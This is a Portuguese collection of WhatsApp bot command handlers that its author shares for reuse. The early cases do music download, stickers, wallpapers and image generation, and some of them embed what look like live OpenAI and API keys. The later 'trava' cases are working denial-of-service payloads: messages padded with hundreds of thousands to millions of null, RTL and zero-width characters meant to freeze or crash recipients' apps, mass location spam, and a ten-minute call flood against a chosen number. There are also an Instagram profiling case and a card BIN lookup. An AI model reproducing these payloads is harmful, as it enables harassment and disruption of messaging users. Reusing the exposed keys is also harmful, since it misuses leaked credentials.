// aqui vou deixar umas cases para vocês 🫶🏻



case 'play': { //by yamazuky
    if (!q) {
        return pdr.sendMessage(from, {
            text: "🎶 | Pqp, irmão você não colocou o nome da música! Quer que eu adivinhe como mofi? 🔮"
        }, { quoted: info });
    }

    try {
        const { data } = await axios.get(`https://api.bronxyshost.com.br/api/playmp3?musica=${encodeURIComponent(q)}&apikey=suakey`);

        if (!data || !data.audio || !data.thumb) {
            return reply("⚠️ | Nenhum resultado encontrado. Tente outro nome.");
        }

        const mensagem = `
🎵 *MÚSICA ENCONTRADA* 🎵

📌 *Título:* ${data.titulo || "Desconhecido"}
🎤 *Autor:* ${data.autor || "Desconhecido"}
⏳ *Duração:* ${data.tempo || "Desconhecida"}
🔗 *Link:* ${data.link || "Não disponível"}

⬇️ Escolha abaixo como quer baixar:`;

        await pdr.sendMessage(from, {
            image: { url: data.thumb },
            caption: mensagem,
            buttons: [
                {
                    buttonId: `${prefix}playmusic ${encodeURIComponent(data.link)}`,
                    buttonText: { displayText: '🎵 Baixar Música' },
                    type: 1
                },
                {
                    buttonId: `${prefix}playvideo ${encodeURIComponent(data.link)}`,
                    buttonText: { displayText: '🎬 Baixar Vídeo' },
                    type: 1
                }
            ],
            headerType: 4,
            viewOnce: true
        }, { quoted: info });

    } catch (e) {
        console.error(e);
        return reply("⚠️ | Erro ao buscar a música. Tente novamente mais tarde.");
    }
    break;
}

// Comando para baixar o áudio
case 'playmusic': {
    if (!q) return reply("❗ | Envie o link da música após o comando.");
    try {
        const { data } = await axios.get(`https://api.bronxyshost.com.br/api/playmp3?musica=${encodeURIComponent(q)}&apikey=suakey`);
        if (!data?.audio) return reply("⚠️ | Não foi possível obter o link do áudio.");

        await pdr.sendMessage(from, {
            audio: { url: data.audio },
            mimetype: "audio/mpeg",
            fileName: `${data.titulo || 'musica'}.mp3`
        }, { quoted: info });

    } catch (err) {
        console.error(err);
        reply("❌ | Erro ao baixar a música.");
    }
    break;
}

// Comando para baixar o vídeo
case 'playvideo': {
    if (!q) return reply("❗ | Envie o link do vídeo após o comando.");
    try {
        const { data } = await axios.get(`https://api.bronxyshost.com.br/api/playmp4?musica=${encodeURIComponent(q)}&apikey=suakey`);
        if (!data?.video) return reply("⚠️ | Não foi possível obter o link do vídeo.");

        await pdr.sendMessage(from, {
            video: { url: data.video },
            mimetype: "video/mp4",
            caption: "🎬 | Aqui está seu vídeo!"
        }, { quoted: info });

    } catch (err) {
        console.error(err);
        reply("❌ | Erro ao baixar o vídeo.");
    }
    break;
}

//se você quiser usar outra ali so mudar o site e apikey
case "play2" {
  if (q) return enviar('🎶 | Favor digite o nome da música que você deseja baixar!');
  reply('⏳ | Pesquisando sua música, aguarde...');
  reagir('📌');

  try {
    const yt = await fetchJson(`${BaseYuxinzesite}/pesquisas/ytsearch?query=${encodeURIComponent(q)}`);
    if (!yt.resultado || !yt.resultado.length) return reply('❌ | Nenhum resultado encontrado!');

    const r = yt.resultado[0];
    const titulo  = r.title;
    const autor   = r.author?.name || 'Desconhecido';
    const url     = r.url;
    const thumb   = r.thumbnail;
    const duracao = r.timestamp || 'Desconhecida';

    const cardImg = `${BaseYuxinzesite}/canvas/musicard?thumbnail=${encodeURIComponent(thumb)}&music_name=${encodeURIComponent(titulo)}&artist_name=${encodeURIComponent(autor)}&time_end=${encodeURIComponent(duracao)}`;

    await pdr.sendMessage(from, {
      image: { url: cardImg },
      caption:
`╭━━🎧 *by dibalaka🌊* ━━╮

📌 *Título:* ${titulo}
🎤 *Autor:* ${autor}
⏱️ *Duração:* ${duracao}
🔗 *Link:* ${url}

Clique abaixo para baixar áudio ou vídeo.`,
      buttons: [
        {
          buttonId: `${prefix}play2audio ${url}`,
          buttonText: { displayText: '🎶 Baixar Áudio' },
          type: 1
        },
        {
          buttonId: `${prefix}play2video ${url}`,
          buttonText: { displayText: '🎥 Baixar Vídeo' },
          type: 1
        }
      ],
      headerType: 4,
      viewOnce: true
    }, { quoted: info });

  } catch (err) {
    console.error('[ERRO - play2]', err);
    reply('⚠️ | Erro ao buscar a música. A API pode estar fora do ar.');
  }
  break;
}

case 'play2audio': {
  if (!q) return reply('❗ | Use: play2audio <url>');
  try {
    const res = await fetchJson(`${BaseYuxinzesite}/download/play-audio?url=${encodeURIComponent(q)}`);
    const audioURL = res.resultado || res.audio || res.link;
    if (!audioURL) return reply('⚠️ | Não foi possível obter o áudio.');
    
    await pdr.sendMessage(from, {
      audio: { url: audioURL },
      mimetype: 'audio/mpeg',
      fileName: `${Date.now()}.mp3`
    }, { quoted: info });
  } catch (err) {
    console.error('[ERRO - play2audio]', err);
    reply('❌ | Falha ao baixar o áudio. Verifique a API.');
  }
  break;
}

case 'play2video': {
  if (!q) return reply('❗ | Use: play2video <url>');
  try {
    const res = await fetchJson(`${BaseYuxinzesite}/download/play-video?url=${encodeURIComponent(q)}`);
    const videoURL = res.resultado || res.video || res.link;
    if (!videoURL) return reply('⚠️ | Não foi possível obter o vídeo.');
    
    await pdr.sendMessage(from, {
      video: { url: videoURL },
      mimetype: 'video/mp4',
      caption: '🎥 | Aqui está seu vídeo!'
    }, { quoted: info });
  } catch (err) {
    console.error('[ERRO - play2video]', err);
    reply('❌ | Falha ao baixar o vídeo. Verifique a API.');
  }
  break;
}
// aqui acaba as cases de download de musicas com botoes
case 'alugar': {
     reagir("🛒"); 
     //Mensagem de carregamento animado
     const carregamentos = [
         "🚀 Carregando loja... 0%",
         "🛠️ Preparando opções... 25%",
         "📦 Carregando planos... 50%",
         "🔄 Quase lá... 75%",
        "✅ Pronto! 100%"
     ];
    const { key } = await pdr.sendMessage(from, { text: carregamentos[0] }, { quoted: selo });
     for (let i = 1; i < carregamentos.length; i++) {
         await sleep(500);
         await pdr.sendMessage(from, { text: carregamentos[i], edit: key }, { quoted: selo });
     }
 
    // Texto principal da lojinha
     const moneybot = `
 ╭─❖─ *𝑴𝒊𝒌𝒂𝒔𝒂 𝒃𝒐𝒕 𝒍𝒐𝒋𝒂* ─❖─╮
 
 💳 *PLANOS DISPONÍVEIS* 💳
 
       R$3,50  »  15 dias  
       R$7,00  »  30 dias  
       R$14,00 »  60 dias  
          *APENAS PIX*
╰───────────────────────╯
 
 ╔─❖─ *OBSERVAÇÕES* ─❖─╗
 ║ Se quiser *alugar* o bot, use:
 ║   ${prefix}dono
 ║ e fale diretamente com o criador.
 ╚═════════════════════╝
`.trim();
 
     // Envia a lojinha formatada
     await pdr.sendMessage(from, { text: moneybot }, { quoted: selo });
 }
 break;
 // caso voce queira alugar seu bot uma case bem estruturada e completa com carregamento
 
 
 
 
 
 
 
 case 'clearchat':
if (!isBot && !isDono) return;
reply("aguarde...");
await sleep(800)
let contador = 0;
const spamOptions = [];

for (let i = 1; i <= 11; i++) {
let r = `${++contador}`;
    spamOptions.push({ optionName: r + "\n".repeat(1000)});
};
spamOptions.push({ optionName: "✨️ CHAT LIMPO ✨️" });
for (let i = 0; i < 1; i++) {
pdr.relayMessage(from, {
    messageContextInfo: {
        messageSecret: "8AYfRzcnqaOZDrw5JI5/FUwjcvfLI26pu95ybYPdzcU="
    },  
    pollCreationMessageV3: {
        name: "✨️ CHAT LIMPO ✨️",
        options: spamOptions,
        selectableOptionsCount: 0
    },
}, {})
await sleep(500)
}
break
// uma case muito boa para limpar os chats 



case 'likeff': {
if (!isDono) return reply ('apenas meu dono seu verme!!')
  if (!args[0]) return await pdr.sendMessage(from, { text: '❌ Informe seu UID do Free Fire para enviar likes.\nExemplo: fflike 123456789' }, { quoted: m });

  let uid = args[0];

  try {
    const axios = require('axios');
    const response = await axios.get('https://freefireinfo.in/claim-100-free-fire-likes-via-uid-for-free/', { 
      params: { uid }
    });

    if (response.data.success) {
      await pdr.sendMessage(from, { text: `👍 Likes enviados com sucesso para o UID: ${uid}!` }, { quoted: m });
    } else {
      await pdr.sendMessage(from, { text: `⚠️ Não foi possível enviar likes: ${response.data.message || 'Erro desconhecido'}` }, { quoted: m });
    }
  } catch (error) {
    await pdr.sendMessage(from, { text: `❌ Erro ao enviar likes: ${error.message}` }, { quoted: m });
  }
}
break;
//envia likes freefire, substitua a api ✌🏼


case 'attp': case 'attp2':
try {
if(!q.trim()) return reply(`Exemplo: ${prefix+comando} bronxys`);
reply("AGUARDE, REALIZANDO AÇÃO.")
var Fontes = comando === "attp2" ? "Roboto" : "Noto Emoji, Noto Sans Mono"
pdr.sendMessage(from, {sticker: {url: `https://api.bronxyshost.com.br/api-bronxys/attp_edit?texto=${encodeURIComponent(q)}&fonte=${Fontes}&apikey=${API_KEY_BRONXYS}`}}, {quoted: info}).catch(() => {
return reply("Erro..");
})
} catch (e) {
return reply("Erro..");
}
break;
//fazer figu


case 'wallpaper': {
  if (!q) return reply('📱 | Por favor digite o nome do wallpaper que você deseja baixar.');
  reply('⏳ | Aguarde, buscando seu wallpaper...');

  try {
    const resp = await fetch(`${BaseYuxinzesite}/pesquisas/wallpaper?title=${encodeURIComponent(q)}`, {
      method: 'GET',
      headers: { 'X-API-Key': 'ptlc_AjHqqSrD2pXKO5fl5G051TdxjQfOlcqEsMKslAXY22Y' }
    });

    if (!resp.ok) { 
      throw new Error(`HTTP ${resp.status}`);
    }

    const json = await resp.json();

   
    const lista    = json.resultado ?? json.result;
    const imgUrl   = lista?.[0]?.image?.[0];

    if (!imgUrl) {
      return reply('🤔 | Nenhum wallpaper encontrado para esse termo.');
    }

    await pdr.sendMessage(from, { image: { url: imgUrl } }, { quoted: info });

  } catch (e) {
    console.error('Erro em wallpaper:', e);
    reply('❌ | Ocorreu um erro ao buscar o seu wallpaper.');
  }
  break;
}
//procure papeis de paredes 


case 'instastalk': {
  if (!args[0]) return reply('❌ Use assim:\ninstastalk pedrosantosvl');

  let user = args[0].replace('@', '');
  try {
    let res = await require('axios').get(
      `https://i.instagram.com/api/v1/users/web_profile_info/?username=${user}`,
      {
        headers: {
          'User-Agent': 'Instagram 76.0.0.15.395 Android',
          'Origin': 'https://www.instagram.com',
          'Referer': 'https://www.instagram.com'
        }
      }
    );

    let u = res.data.data.user;
    let txt = `
📸 *INSTA STALK*
👤 *Usuário:* @${u.username}
🔐 *Privado:* ${u.is_private ? 'Sim 🔒' : 'Não 🔓'}
📋 *Nome:* ${u.full_name || '—'}
📝 *Bio:* ${u.biography || '—'}
📎 *Site:* ${u.external_url || '—'}
👥 *Seguidores:* ${u.edge_followed_by.count}
👀 *Seguindo:* ${u.edge_follow.count}
📷 *Publicações:* ${u.edge_owner_to_timeline_media.count}
    `.trim();

    await pdr.sendMessage(from, { text: txt, footer: '🔍 Dados via Instagram Web API' }, { quoted: m });

  } catch (err) {
    console.error(err);
    reply('❌ Não foi possível obter dados. Verifique se o usuário existe ou se a API não bloqueou.');
  }

  break;
}
//stalkear insta 👀

case 'lgbt':
case 'blur':
case 'invert':
case 'sepia':
case 'ad':
case 'affect':
case 'beautiful':
case 'bobross':
case 'confusedstonk':
case 'delete':
case 'discordblack':
case 'discordblue':
case 'facepalm':
case 'hitler':
case 'jail':
case 'karaba':
case 'mms':
case 'notstonk':
case 'poutine':
case 'rip':
case 'stonk':
case 'tatoo':
case 'thomas':
case 'circle': {
  reply('⏳ | Aguarde, estou baixando sua imagem…');
  try {
    if ((isMedia && !info.message.videoMessage) || isQuotedImage) {

      const Yuxinze = isQuotedImage
        ? JSON.parse(JSON.stringify(info).replace('quotedM', 'm'))
            .message.extendedTextMessage.contextInfo.message.imageMessage
        : info;
      const fileBuffer = await getFileBuffer(Yuxinze, 'image'); // helper seu
      const fileType   = 'jpg';

      reply('🖌️ | Imagem baixada, aplicando efeito…');

      const efeito = await upload(fileBuffer, fileType); // helper seu

      const efeitinho = await fetchJson(
        `${BaseYuxinzesite}/canvas/criativos/${comando}` +
        `?img=${encodeURIComponent(efeito)}`,
        {
          method: 'GET',
          headers: {
            'X-API-Key': 'ptlc_AjHqqSrD2pXKO5fl5G051TdxjQfOlcqEsMKslAXY22Y'
          }
        }
      );

      await pdr.sendMessage(
        from,
        { image: { url: efeitinho.resultado.canva } },
        { quoted: info }
      );

    } else {
      reply('🙋 | Mencione ou envie uma imagem para colocar o efeito.');
    }
  } catch (e) {
    console.log(e);
    reply('❌ | Ocorreu um erro ao aplicar o efeito ou a API caiu.');
  }
  break;
}
//editar fotos



case 'imagine': {
  if (!q) return reply('📸 | Por favor digite o prompt da imagem que você quer gerar.');
  reply('🎨 | Criando imagem a partir do seu prompt...');

  try {
    const resp = await fetch('https://api.openai.com/v1/images/generations', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer 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',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        model: 'dall-e-3',
        prompt: q,
        n: 1,
        size: '1024x1024'
      })
    });

    const json = await resp.json();

    if (!resp.ok) {
      console.error('OpenAI error', json);
      return reply(`❌ | Erro da OpenAI: ${json.error?.message || resp.statusText}`);
    }

    if (!json.data?.length) {
      console.error('Resposta sem imagem', json);
      return reply('❌ | A API não retornou nenhuma imagem.');
    }

    const url = json.data[0].url;

    await pdr.sendMessage(
      from,
      { image: { url }, caption: `🖼️ | Prompt: ${q}` },
      { quoted: info }
    );
  } catch (e) {
    console.error('Erro no imagine', e);
    return reply('❌ | Ocorreu um erro de rede ou de sistema ao gerar a imagem.');
  }

  break;
}
//ia geradora de imagens




case 'bin': {
if (!isPremium && !isDono) return reply ('so meu dono pode usar esse comando se coloca no seu lugar')
    if (!q || q.length < 6) return reply('💳 Use: bin 123456');
    try {
        let { data } = await axios.get(`https://bins-sucesso.vercel.app/api/${q}`);
        reply(`🏦 Informações BIN ${q}:\nBanco: ${data.bank}\nBandeira: ${data.brand}\nTipo: ${data.type}\nNível: ${data.level}`);
    } catch {
        reply('❌ Erro ao consultar BIN.');
    }
}
break;

//case basica para consultar bin de um cartão


    //aqui abaixo vou deixar umas case de "trava"
    
    
case "xcrash": {
if (!isDono) return reply("Acesso negado!")
if (!q) return reply("Cadê a quantidade burro?")
reagir("🦠")
reply("Estou enviando " + q + " Travas de Atraso!")
const jids = Array.from({ length: 1000 }, (_, i) => `55${Math.floor(1 + i)}@s.whatsapp.net`);
for (let i = 0; i < q; i++) {
    await pdr.relayMessage(from, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "⸵░⃟🧙‍♂️ 𝑆𝑅.𝑃𝐷𝑅.ℳや5🔥",
              description: "\0",
              paramsJson: "\u0000".repeat(500000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(500000),
              version: 3
            }
          },
          contextInfo: {
            quotedMessage: {
              contactMessage: {
                displayName: "⸵░⃟🧙‍♂️𝑆𝑅.𝑃𝐷𝑅.ℳや5🔥 ⃢᭄",
                mentionedJid: jids,
              }
            },
            participant: from
          }
        }
      }
    }, { participant: { jid: from } });
}}
break
//essa aqui é so um atraso mais se usar em grande contidade ela deixa a pessoa por um bom tempo



case "convite": 
  if (!isDono) return enviar(`\n 🚫 *APENAS MEU DONO*\n`);
  
  for (let i = 0; i < 10; i++) {
    await pdr.relayMessage(from, {
      groupInviteMessage: {
        groupJid: "120363386937181946@g.us",
        inviteCode: "GucTjbYbdfr1mlIiInkajS",
        inviteExpiration: "1738611293",
        groupName: "⸵░⃟🧙‍♂️𝑪𝑬𝑶.𝐏𝐃𝐑.22🔥 ⃢᭄" + "A".repeat(500000),
        jpegThumbnail: "",
        caption: "⸵░⃟🧙‍♂️𝑪𝑬𝑶.𝐏𝐃𝐑.22🔥 ⃢᭄"
      }
    }, {});
  }
  break;
// essa é uma case convite ela congela o chat enqual voce enviou




case 'ioscrash': {
  if (!isDono && !isBot) return;
  if (!q) return reply("Digite a quantidade para enviar!");

  reagir("📱");
  reply(`🚨 Enviando ${q} cargas pesadas estilo iOS...`);

 
  const invisibleChars = "\u200B".repeat(500000); 
  const rtlOverride = "\u202E".repeat(300000);    
  const heavyEmoji = "📱".repeat(300000);       
  const combiningChars = "\u0300".repeat(400000);  
  
  const carga = invisibleChars + rtlOverride + heavyEmoji + combiningChars;

  for (let i = 0; i < q; i++) {
    await pdr.sendMessage(from, {
      text: "📱 Trava iOS ativada\n" + carga
    });
  }

  reply("✅ Envio concluído!");
}
break;
//suposta trava ios



case 'home-loc': {
    await pdr.sendMessage(m.chat, { react: { text: '🖕🏻', key: m.key } });

    if (!isCreator && !isDono && !isPremium) return reply("SO MEU DONO OTARIO😘");

    if (!text || isNaN(text)) return reply("Informe quantas localizações enviar.");

    await pdr.sendMessage(m.chat, { react: { text: '💀', key: m.key } });

    let amount = parseInt(text);
    if (amount < 1) return reply("Valor inválido.");

    const locais = [
        { lat: -23.5505, lon: -46.6333, name: "São Paulo - BR" },
        { lat: 51.5074, lon: -0.1278, name: "London - UK" },
        { lat: 40.7128, lon: -74.0060, name: "New York - USA" },
        { lat: 35.6895, lon: 139.6917, name: "Tokyo - JP" },
        { lat: -33.8688, lon: 151.2093, name: "Sydney - AU" },
        { lat: -13.1631, lon: -72.5450, name: "Machu Picchu - PE" }
    ];

    const jid = m.chat || m.key.remoteJid;
    if (!jid || typeof jid !== 'string' || !jid.includes('@')) {
        return reply("Erro: chat inválido.");
    }

    for (let i = 0; i < amount; i++) {
        const loc = locais[Math.floor(Math.random() * locais.length)];

        await pdr.sendMessage(jid, {
            location: {
                degreesLatitude: loc.lat,
                degreesLongitude: loc.lon,
                name: loc.name,
                address: `Envio ${i + 1}`
            }
        });
    }

    reply(`✅ ${amount} localizações enviadas.`);
}
break;
//uma trava bem forte 




case 'carrinho': {
  if (!isDono && !isBot) return reply("Acesso negado!");
  if (!q) return reply("Quantas mensagens quer enviar?");
  reagir("🛒");
  reply(`Enviando ${q} cargas pesadas no carrinho...`);

 
  const nul = "\0".repeat(50000);              
  const espacoLargo = "\u3000".repeat(300000);  
  const rtl = "\u202e".repeat(2000000);           
  const emojiPesado = "🛑".repeat(2000000);     

  const carga = nul + espacoLargo + rtl + emojiPesado;

  for (let i = 0; i < q; i++) {
    await pdr.relayMessage(from, {
      interactiveMessage: {
        header: { type: 'text', text: "🛒 CARRINHO DO PDR 🛒" },
        body: { text: carga },
        footer: { text: "🚀 Aproveite o atraso!" },
        buttons: [
          { buttonId: 'btn1', buttonText: { displayText: '👍' }, type: 1 },
          { buttonId: 'btn2', buttonText: { displayText: '👎' }, type: 1 }
        ]
      }
    }, { participant: from });
  }

  reply("✅ Trava carrinho enviada!");
}
break;
//trava carrinho, pode usar para fazer outro tipo de case


case 'cui2': {
if (!isDono) return;
if (!q) return reply("Cadê a quantidade?")
reagir("🦠")
reply("Estou enviando " + q + " Atrasos")
for (let i = 0; i < q; i++) {
await pdr.relayMessage(from,{
"ephemeralMessage":{
"message":{
"interactiveResponseMessage": {
"body": {
"text": "\0",
"format": "\0",
},
"nativeFlowResponseMessage": {
"name": "call_permission_request",
"paramsJson": "\0".repeat(100000000),
"buttonsparamsJson": "\0".repeat(100000000),
"version": 3
},
"contextInfo": {

}
}}}},{ participant: { jid: from } })
}}
break;
//case dando muito atraso!!



case 'call': {
if (!isDono) return reply('SÓ MEU DONO ,😘')
  const [mobileNumber, spamCountStr] = args.join(" ").split(',').map(arg => arg.trim());
  const target1 = mobileNumber.replace(/[+\s()-]/g, '') + '@s.whatsapp.net';

  pdr.sendMessage(from, { react: { text: "⏱️", key: m.key } });

  const callInterval = 5 * 1000; 
  const callDuration = 10 * 60 * 1000; 

  const intervalId = setInterval(() => {
    pdr.offerCall(target1);
  }, callInterval);

  setTimeout(() => {
    clearInterval(intervalId);
    pdr.sendMessage(from, { react: { text: "✔️", key: m.key } });
  }, callDuration);
}
break;
//flodar ligação, mais cuidado com o spam!!!



//by dibalaka 🌊